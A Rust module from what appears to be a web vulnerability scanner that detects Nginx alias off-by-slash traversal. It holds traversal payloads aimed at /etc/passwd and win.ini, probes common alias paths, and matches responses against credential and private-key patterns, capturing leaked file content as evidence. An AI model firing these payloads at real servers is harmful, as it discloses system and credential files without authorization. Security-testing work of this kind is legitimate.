//! Nginx Alias Traversal Detection Module
//!
//! Detects Nginx alias traversal via off-by-slash misconfigurations.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// Nginx alias traversal module
pub struct NginxAliasModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    test_cases: Vec<NginxTestCase>,
}

/// Nginx alias test case
#[derive(Debug, Clone)]
pub struct NginxTestCase {
    pub name: &'static str,
    pub alias_path: &'static str,
    pub target_path: &'static str,
    pub traversal_payload: &'static str,
    pub description: &'static str,
    pub severity: FindingSeverity,
}

impl NginxAliasModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            test_cases: Self::define_test_cases(),
        }
    }

    /// Define Nginx alias traversal test cases
    fn define_test_cases() -> Vec<NginxTestCase> {
        vec![
            // Classic off-by-slash misconfiguration
            NginxTestCase {
                name: "off_by_slash_root",
                alias_path: "/static/",
                target_path: "/var/www/static",
                traversal_payload: "/static../etc/passwd",
                description: "Nginx alias off-by-slash: /static/ maps to /var/www/static but /static../ traverses to parent",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_nested",
                alias_path: "/assets/",
                target_path: "/var/www/assets",
                traversal_payload: "/assets../etc/passwd",
                description: "Nested alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_api",
                alias_path: "/api/",
                target_path: "/var/www/api",
                traversal_payload: "/api../etc/passwd",
                description: "API alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_uploads",
                alias_path: "/uploads/",
                target_path: "/var/www/uploads",
                traversal_payload: "/uploads../etc/passwd",
                description: "Uploads alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_media",
                alias_path: "/media/",
                target_path: "/var/www/media",
                traversal_payload: "/media../etc/passwd",
                description: "Media alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_files",
                alias_path: "/files/",
                target_path: "/var/www/files",
                traversal_payload: "/files../etc/passwd",
                description: "Files alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_images",
                alias_path: "/images/",
                target_path: "/var/www/images",
                traversal_payload: "/images../etc/passwd",
                description: "Images alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_css",
                alias_path: "/css/",
                target_path: "/var/www/css",
                traversal_payload: "/css../etc/passwd",
                description: "CSS alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_js",
                alias_path: "/js/",
                target_path: "/var/www/js",
                traversal_payload: "/js../etc/passwd",
                description: "JavaScript alias off-by-slash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "off_by_slash_static_files",
                alias_path: "/static/files/",
                target_path: "/var/www/static/files",
                traversal_payload: "/static/files../etc/passwd",
                description: "Nested static files alias off-by-slash",
                severity: FindingSeverity::High,
            },
            
            // Traversal with multiple levels
            NginxTestCase {
                name: "multi_level_traversal",
                alias_path: "/static/",
                target_path: "/var/www/static",
                traversal_payload: "/static../../../../etc/passwd",
                description: "Multi-level traversal via alias",
                severity: FindingSeverity::Critical,
            },
            NginxTestCase {
                name: "multi_level_nested",
                alias_path: "/assets/images/",
                target_path: "/var/www/assets/images",
                traversal_payload: "/assets/images../../../../etc/passwd",
                description: "Multi-level traversal from nested alias",
                severity: FindingSeverity::Critical,
            },
            
            // Encoded traversal
            NginxTestCase {
                name: "encoded_traversal",
                alias_path: "/static/",
                target_path: "/var/www/static",
                traversal_payload: "/static%2e%2e/etc/passwd",
                description: "URL encoded dot traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "double_encoded_traversal",
                alias_path: "/static/",
                target_path: "/var/www/static",
                traversal_payload: "/static%252e%252e/etc/passwd",
                description: "Double URL encoded dot traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "unicode_traversal",
                alias_path: "/static/",
                target_path: "/var/www/static",
                traversal_payload: "/static%c0%af%c0%af/etc/passwd",
                description: "UTF-8 overlong encoded traversal",
                severity: FindingSeverity::High,
            },
            
            // Windows-style paths
            NginxTestCase {
                name: "windows_traversal",
                alias_path: "/static/",
                target_path: "C:\\www\\static",
                traversal_payload: "/static..\\..\\windows\\win.ini",
                description: "Windows-style backslash traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "mixed_slash_traversal",
                alias_path: "/static/",
                target_path: "/var/www/static",
                traversal_payload: "/static..\\../etc/passwd",
                description: "Mixed slash traversal",
                severity: FindingSeverity::High,
            },
            
            // Alias with trailing slash variations
            NginxTestCase {
                name: "alias_no_trailing_slash",
                alias_path: "/static",
                target_path: "/var/www/static",
                traversal_payload: "/static../etc/passwd",
                description: "Alias without trailing slash",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "alias_double_slash",
                alias_path: "/static//",
                target_path: "/var/www/static",
                traversal_payload: "/static//../etc/passwd",
                description: "Alias with double trailing slash",
                severity: FindingSeverity::Medium,
            },
            
            // Common application paths
            NginxTestCase {
                name: "admin_panel",
                alias_path: "/admin/",
                target_path: "/var/www/admin",
                traversal_payload: "/admin../etc/passwd",
                description: "Admin panel alias traversal",
                severity: FindingSeverity::Critical,
            },
            NginxTestCase {
                name: "phpmyadmin",
                alias_path: "/phpmyadmin/",
                target_path: "/usr/share/phpmyadmin",
                traversal_payload: "/phpmyadmin../etc/passwd",
                description: "phpMyAdmin alias traversal",
                severity: FindingSeverity::Critical,
            },
            NginxTestCase {
                name: "wordpress_wp_admin",
                alias_path: "/wp-admin/",
                target_path: "/var/www/wp-admin",
                traversal_payload: "/wp-admin../etc/passwd",
                description: "WordPress wp-admin alias traversal",
                severity: FindingSeverity::Critical,
            },
            NginxTestCase {
                name: "wordpress_wp_content",
                alias_path: "/wp-content/",
                target_path: "/var/www/wp-content",
                traversal_payload: "/wp-content../etc/passwd",
                description: "WordPress wp-content alias traversal",
                severity: FindingSeverity::High,
            },
            NginxTestCase {
                name: "drupal_admin",
                alias_path: "/admin/",
                target_path: "/var/www/admin",
                traversal_payload: "/admin../etc/passwd",
                description: "Drupal admin alias traversal",
                severity: FindingSeverity::High,
            },
        ]
    }

    /// Test Nginx alias traversal
    async fn test_alias_traversal(
        &self,
        ctx: &CheckContext,
        test_case: &NginxTestCase,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}{}", ctx.target_url, test_case.traversal_payload);
        
        let response = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        // Check for sensitive file content
        if self.is_sensitive_content(&body) {
            // Additional validation
            if self.is_false_positive(&body, &headers, status) {
                return Ok(None);
            }

            let evidence = self.create_evidence(&test_url, &body, &headers, status, test_case);
            let finding = Finding::new(
                "nginx_alias_traversal",
                test_case.severity,
                "Nginx Alias Traversal",
                format!("Nginx alias traversal detected: {}", test_case.description),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(test_case.traversal_payload.to_string())
            .with_evidence(evidence)
            .with_confidence(85)
            .with_tags(vec!["traversal", "nginx-alias", "off-by-slash", "path-traversal"])
            .with_cwe("CWE-22")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Test common alias paths by probing
    async fn test_common_aliases(
        &self,
        ctx: &CheckContext,
    ) -> Result<Vec<Finding>, ModuleError> {
        let mut findings = Vec::new();
        
        // Common alias prefixes to test
        let common_aliases = [
            "/static", "/assets", "/media", "/uploads", "/files",
            "/images", "/css", "/js", "/scripts", "/styles",
            "/public", "/static/files", "/assets/images",
            "/admin", "/phpmyadmin", "/wp-admin", "/wp-content",
            "/api", "/v1", "/v2", "/graphql", "/rest",
        ];

        for alias in &common_aliases {
            // Test basic off-by-slash
            let payload = format!("{}../etc/passwd", alias);
            let test_url = format!("{}{}", ctx.target_url, payload);
            
            let response = self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            if let Ok(resp) = response {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                if self.is_sensitive_content(&body) && !self.is_false_positive(&body, &headers, status) {
                    let evidence = self.create_probe_evidence(&test_url, &body, &headers, status, alias, &payload);
                    let finding = Finding::new(
                        "nginx_alias_traversal_probe",
                        FindingSeverity::High,
                        "Nginx Alias Traversal (Probe)",
                        format!("Potential Nginx alias traversal via {}", alias),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(payload)
                    .with_evidence(evidence)
                    .with_confidence(70)
                    .with_tags(vec!["traversal", "nginx-alias", "probe", "off-by-slash"])
                    .with_cwe("CWE-22")
                    .with_agent_id(ctx.agent_id);

                    findings.push(finding);
                }
            }
        }

        Ok(findings)
    }

    /// Check for sensitive content in response
    fn is_sensitive_content(&self, body: &Bytes) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        let sensitive_patterns = [
            "root:", "daemon:", "bin:", "sys:", "nobody:",
            "/bin/bash", "/bin/sh", "/usr/sbin/nologin",
            "root:$", "$1$", "$5$", "$6$", "$y$",
            "127.0.0.1", "localhost", "::1",
            "Linux version", "gcc version",
            "PATH=", "HOME=", "USER=", "SHELL=",
            "[fonts]", "[extensions]", "run=", "load=",
            "[boot loader]", "[operating systems]",
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "-----BEGIN PRIVATE KEY-----",
            "Port", "PermitRootLogin", "PubkeyAuthentication",
            "root\tALL", "%sudo", "%wheel", "NOPASSWD",
        ];

        for pattern in &sensitive_patterns {
            if body_str.contains(pattern) {
                return true;
            }
        }

        false
    }

    /// Check for false positive indicators
    fn is_false_positive(&self, body: &Bytes, headers: &[(String, String)], status: u16) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        let false_positive_patterns = [
            "file not found", "no such file", "failed to open stream",
            "permission denied", "access denied", "forbidden",
            "unauthorized", "internal server error", "service unavailable",
            "bad gateway", "gateway timeout", "the system cannot find",
            "cannot find the file", "path not found", "file does not exist",
            "404 not found", "403 forbidden", "500 internal",
        ];

        for pattern in &false_positive_patterns {
            if body_str.to_lowercase().contains(pattern) {
                return true;
            }
        }

        if status >= 400 && body.len() < 500 {
            return true;
        }

        let error_page_indicators = [
            "<html><head><title>error</title>",
            "<html><head><title>404</title>",
            "<html><head><title>500</title>",
            "nginx error page", "apache error page", "iis error page",
        ];

        for indicator in &error_page_indicators {
            if body_str.to_lowercase().contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Create evidence for test case finding
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        test_case: &NginxTestCase,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("Nginx alias traversal: alias={}, target={}, payload='{}', status={}, bytes={}", 
                test_case.alias_path, test_case.target_path, test_case.traversal_payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 85,
        }
    }

    /// Create evidence for probe finding
    fn create_probe_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        alias: &str,
        payload: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("Nginx alias probe: alias={}, payload='{}', status={}, bytes={}", 
                alias, payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 70,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for NginxAliasModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Nginx Alias Traversal module initialized with {} test cases", self.test_cases.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "nginx_alias_traversal",
                "Nginx Alias Traversal",
                "Detects Nginx alias traversal via off-by-slash misconfigurations",
                Severity::High,
                CheckCategory::PathTraversal,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["traversal", "nginx-alias", "off-by-slash", "misconfiguration"])
            .with_references(vec![
                "https://github.com/teknogeek/nginx-alias-traversal",
                "https://portswigger.net/web-security/file-path-traversal",
                "https://www.acunetix.com/vulnerabilities/web/nginx-alias-traversal/",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        true // Can run without parameters
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(200);

        // Test defined test cases
        for test_case in &self.test_cases {
            if request_count >= max_requests / 2 {
                break;
            }

            if let Some(finding) = self.test_alias_traversal(&ctx, test_case).await? {
                findings.push(finding);
            }
            request_count += 1;
        }

        // Probe common aliases
        if request_count < max_requests {
            let probe_findings = self.test_common_aliases(&ctx).await?;
            findings.extend(probe_findings);
            request_count += 20; // estimate
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        50 // Medium priority
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_traversal", "normalization_bypass"]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_define_test_cases() {
        let cases = NginxAliasModule::define_test_cases();
        
        assert!(!cases.is_empty());
        assert!(cases.iter().any(|c| c.name == "off_by_slash_root"));
        assert!(cases.iter().any(|c| c.name == "off_by_slash_nested"));
        assert!(cases.iter().any(|c| c.name == "multi_level_traversal"));
        assert!(cases.iter().any(|c| c.name == "encoded_traversal"));
        assert!(cases.iter().any(|c| c.name == "admin_panel"));
        assert!(cases.iter().any(|c| c.name == "phpmyadmin"));
    }

    #[test]
    fn test_is_sensitive_content() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = NginxAliasModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("root:x:0:0:root:/root:/bin/bash");
        assert!(module.is_sensitive_content(&body));
        
        let body2 = Bytes::from("File not found");
        assert!(!module.is_sensitive_content(&body2));
    }

    #[test]
    fn test_is_false_positive() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = NginxAliasModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("File not found: /etc/passwd");
        let headers = vec![];
        
        assert!(module.is_false_positive(&body, &headers, 404));
    }
}